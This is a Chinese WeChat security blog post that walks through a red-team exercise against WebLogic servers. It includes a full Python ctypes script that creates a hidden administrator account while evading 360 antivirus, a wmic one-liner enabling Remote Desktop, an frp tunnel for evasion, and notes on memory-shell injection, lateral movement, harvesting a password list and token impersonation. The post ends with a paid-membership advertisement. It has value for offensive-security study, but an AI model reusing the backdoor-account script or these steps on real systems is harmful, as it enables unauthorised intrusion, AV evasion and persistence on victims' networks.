---
title: 突破 Weblogic盘下整个内网
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495102&idx=1&sn=08ac77f07c4092dc01fe4f6c47bb0b9c&chksm=e8a5e7dddfd26ecbf41a0bf647885e13e7555297d1061c6ab4c9eba6e57fbce911e1b5c27d92&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-07-04
fetch_date: 2025-10-06T17:44:39.776648
---

# 突破 Weblogic盘下整个内网

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj7CKKPFAU6nw35DAYeicBDppwYsu9nbpl13GER2bmAE0Xnia4A5I51lacvyQqYevMicuHdqvQUGQr5Nw/0?wx_fmt=jpeg)

# 突破 Weblogic盘下整个内网

西山云安

迪哥讲事

0

免责声明

文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4f3sokB9l27ib2EKm92Qf3iaIpFJ1St4SdGTyicHrKLpKYQvsQzGMiaeWY7g/640?wx_fmt=gif)

01

正文

演练中找到一处weblogic404报错，使用很多工具都没有利用成功，通过github找到weblogic一把梭哈利用工具，命令执行失败，随手尝试一发注入内存马，居然有返回，真是梭哈出奇迹。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODnSTukOnrGkJwQibTscCpv8IkYXXqZUY0SAUbPcLDTh81EeJ8Tr369zA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODX16MLOVl4kux2ySsI3unOmQmIfxic5kRicQYgq3wEt9w6JD83V7sgTQQ/640?wx_fmt=png)

信息收集发现Windows2003带360主动防御。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODDfA1NTxsZb4z9ZVFiatJfiac7gs8akCUPCJJtSoSFDAMHr0VGsFQxrdg/640?wx_fmt=png)

用一下Github上老表的frp，给这360过了。

```
https://github.com/seventeenman/Forest
```

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODibOBYDtAX2Nz8IxMiaZz8ThqC0LMarkJjwZB4aUibiaibibC98w2kvrZeicibw/640?wx_fmt=png)

代理有了就开始内网大操作了。

既然权限够高。直接python编写windows-api绕过360创建用户。

```
import ctypesfrom ctypes import wintypesfrom ctypes import *import sys

USER_PRIV_GUEST = 0USER_PRIV_USER = 1USER_PRIV_ADMIN = 2UF_SCRIPT = 1UF_NORMAL_ACCOUNT = 512LPBYTE = POINTER(c_byte)

class USER_INFO_1(ctypes.Structure):    _fields_ = [        (            'usri1_name', wintypes.LPWSTR),        (            'usri1_password', wintypes.LPWSTR),        (            'usri1_password_age', wintypes.DWORD),        (            'usri1_priv', wintypes.DWORD),        (            'usri1_home_dir', wintypes.LPWSTR),        (            'usri1_comment', wintypes.LPWSTR),        (            'usri1_flags', wintypes.DWORD),        (            'usri1_script_path', wintypes.LPWSTR)]

class _LOCALGROUP_MEMBERS_INFO_3(ctypes.Structure):    _fields_ = [        (            'lgrmi3_domainandname', wintypes.LPWSTR)]

def adduser(username='admin1234', password='admin@1234'):    ui = USER_INFO_1()    ui.usri1_name = username    ui.usri1_password = password    ui.usri1_priv = USER_PRIV_USER    ui.usri1_home_dir = None    ui.usri1_comment = None    ui.usri1_flags = UF_SCRIPT    ui.usri1_script_path = None    a = ctypes.windll.Netapi32.NetUserAdd(None, 1, ui, None)    if a == 0:        print("tambah pengguna success : nama={} kata laluan={}".format(username,password))    else:        print('tambah pengguna pengguna ralat')    return

def addgroup(username='Test1234', groupname='Administrators'):    name = _LOCALGROUP_MEMBERS_INFO_3()    name.lgrmi3_domainandname = username    ctypes.windll.Netapi32.NetLocalGroupAddMembers.argtypes = (        wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, LPBYTE, wintypes.DWORD)    b = ctypes.windll.Netapi32.NetLocalGroupAddMembers(None, groupname,3, LPBYTE(name),1)    if b == 0:        print("Tambah ke kumpulan success : nama={} kumpulan={}".format(username,groupname))    else:        print('Tambah ke kumpulan ralat')    return

def main():    if len(sys.argv) == 1:        adduser()        addgroup()    elif len(sys.argv) == 3:        adduser(str(sys.argv[1]), str(sys.argv[2]))        addgroup(str(sys.argv[1]))    elif len(sys.argv) == 4:        adduser(str(sys.argv[1]), str(sys.argv[2]))        addgroup(str(sys.argv[1]), str(sys.argv[3]))    else:        print('usage: {} username password').format(sys.argv[1])        print('usage: {} username password groupname').format(sys.argv[1])

if __name__ == '__main__':    main()
```

```
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

上来桌面就给他360退了，创建号用户上来看一眼桌面，这位阿瑟电脑上真干净。（好像看到了qax公司得天擎，不过没有关系，关不掉可以改拦截规则）

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODURf7kUAzM6G8awdxriatVGPicmtDl02rFCWiboueM4HrtzBXY7v3ib7cFQ/640?wx_fmt=png)

横向找到另一台Weblogic

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODAo52ROUiaicP2Oa9oK2c5dCia5RMEeTSPVdZhHuZJaNy0LGhy35l0ZSbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODuHiaUm2t8Kh4CRLSib3jDW581cG9qvnK0xxKf1K8UiaLORUh605cl8MTw/640?wx_fmt=png)

相同操作，拿到另一台远程桌面。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicOD3U762iajKqIXt1VoplJhGibbQicy66pgWWiczy4RhqGdNh18F3ibA7ll5bw/640?wx_fmt=png)

啊？？？？这就是传说中的，密码本。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODiczhibMk4kE6kldWa4OmoKQqDgpd3BOU4NbNnWXFqUeT3QS4RQicZK1Ew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicOD3PicF3ZB07fkl5ic5LBvGf9Nwurj3leqcdK6B2ia3XsWKcgnd6KlXOOSw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODT88fOGEhP7Eibm3xfrm8O93nfb1WXON0mOA4VOwdictlvfibEiaM1SheIw/640?wx_fmt=png)

猜测打到运维机了，使用SelectMyParent切入到administrator桌面，简直辣眼睛。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODldA5BxpPwotOKaPUM0PfkQHqR3edXjbjYa68pGIacI3qLaAiaSekicNA/640?wx_fmt=png)

临近YL结束，跟着密码本翻阅了所有机器，没有拿下靶标。

该收工了，从通讯录拿到靶标系统负责人，给钓鱼老表留个言，我就撤了。

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4p1SKq8yUTagvUOXZ0vwicODd7PwdqbqXZj5xPvVroXoM9FXCywc7iaia5iaNVXE0dBeFxDHzvqCB62Cw/640?wx_fmt=png)

02

总结

经过很多年GFYL，各地EDR也是部署相当完备，免杀绕过杀软EDR也慢慢成为家常便饭，这里也只是提供一种短小精悍得绕过思路。

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过